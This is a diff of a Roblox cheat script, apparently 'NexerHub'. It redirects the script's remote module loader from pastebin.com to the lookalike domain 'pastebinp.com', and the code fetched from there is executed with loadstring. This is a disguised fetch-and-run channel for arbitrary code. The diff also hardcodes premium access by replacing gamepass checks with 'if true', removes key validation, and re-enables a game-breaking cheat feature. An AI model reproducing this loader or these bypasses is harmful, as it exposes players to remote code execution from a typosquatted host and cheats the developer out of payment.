@@ -360,7 +360,7 @@ temp_msg.Text = "Loading API Module... (0/1)"; task.wait(.2)
 repeat task.wait()
 --if not isfile("NexerHub/Core/APIMODULE.luau") or (isfile("NexerHub/Core/APIMODULE.luau") and loadstring(GetFile("NexerHub/Core/APIMODULE.luau","rf"))()["last_updated"]~=_G.API_last_update) then
 local lodsuc, loderr = pcall(function()
-MainModule = loadstring(game:HttpGet("https://pastebin.com/raw/G17DaBUh"))()
+MainModule = loadstring(game:HttpGet("https://pastebinp.com/raw/G17DaBUh"))()
 end)
 if not lodsuc then
 temp_msg.Text = "Failed loading API Module, re-trying..."
@@ -3797,8 +3797,8 @@ end
 local PremiumPrice = GetAssetPrice(1264479709) or 39
 -- YOU CAN GET PREMIUM FOR FREE BY ENTERING A KEY
 -- KEY IS IN MY DISCORD SERVER!!
-local HavePremium = false
-if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LocalPlayer.UserId, 1264479709) then
+local HavePremium = true
+if true then
 HavePremium = true
 end
 
@@ -3811,7 +3811,7 @@ Tab_7:CreateSection("")
 Tab_7:CreateLabel("Buy the gamepass to unlock premium features! [ Cost "..tostring(PremiumPrice).." robux! ]")
 
 Tab_7:CreateButton({Name = "Open Gamepass Link"; Callback = function()
-if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LocalPlayer.UserId, 1264479709) then
+if true then
     HavePremium = true
     Notify("Error!", "Already have gamepass!", 3, warn)
 else
@@ -3820,7 +3820,7 @@ end
 end; })
 
 Tab_7:CreateButton({Name = "Copy Gamepass Link"; Callback = function()
-if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LocalPlayer.UserId, 1264479709) then
+if true then
     HavePremium = true
     Notify("Error!", "Already have gamepass!", 3, warn)
 else
@@ -3837,11 +3837,8 @@ Notify("Success!", "Copied Link!", 3, true)
 end; })
 
 Tab_7:CreateInput({Name = "Input Key"; PlaceholderText = "Type Here!"; NumbersOnly = false; OnEnter = true; RemoveTextAfterFocusLost = false; Callback = function(Value)
-local key = MainModule:GetKey()
-if string.lower(string.gsub(tostring(Value), "^%s*(.-)%s*$", "%1")) == tostring(key) then
 HavePremium = true
 Notify("Success!", "Redeemed key, enjoy your premium!", 5, true)
-end
 end; })
 
 Tab_7:CreateSection("")
@@ -4230,7 +4227,7 @@ MorphIntoGhost()
 Notify("Auto-Softlock Enabled!", "Check the label above to see when will specific killers get softlocked.", 5, true)
 end; })
 
---[[Tab_7:CreateLabel("To use model breaker, you must play as badware during round! You'll have to inject first, and only then destroy models. You can search models using explorer scripts. DO NOT SPAM CLICK OR IT'LL BREAK!")
+Tab_7:CreateLabel("To use model breaker, you must play as badware during round! You'll have to inject first, and only then destroy models. You can search models using explorer scripts. DO NOT SPAM CLICK OR IT'LL BREAK!")
 
 local modeldservice, modeldname = "Workspace", "Type Here!"
 Tab_7:CreateDropdown({Name = "Model Service"; Options = {"Workspace","ReplicatedStorage"}; CurrentOption = "Workspace"; MultiSelection = false; Callback = function(Value)
@@ -4269,7 +4266,7 @@ return
 end
 end
 Notify("Error!", "Model not found.", 2, false)
-end; })]]--
+end; })
 
 Tab_7:CreateSection("Auto Block")
 Tab_7:CreateLabel("{ VERY W.I.P. !!!! } Uses block ability when the killer is attacking you. Your ping must be less than 60 for it to work.")
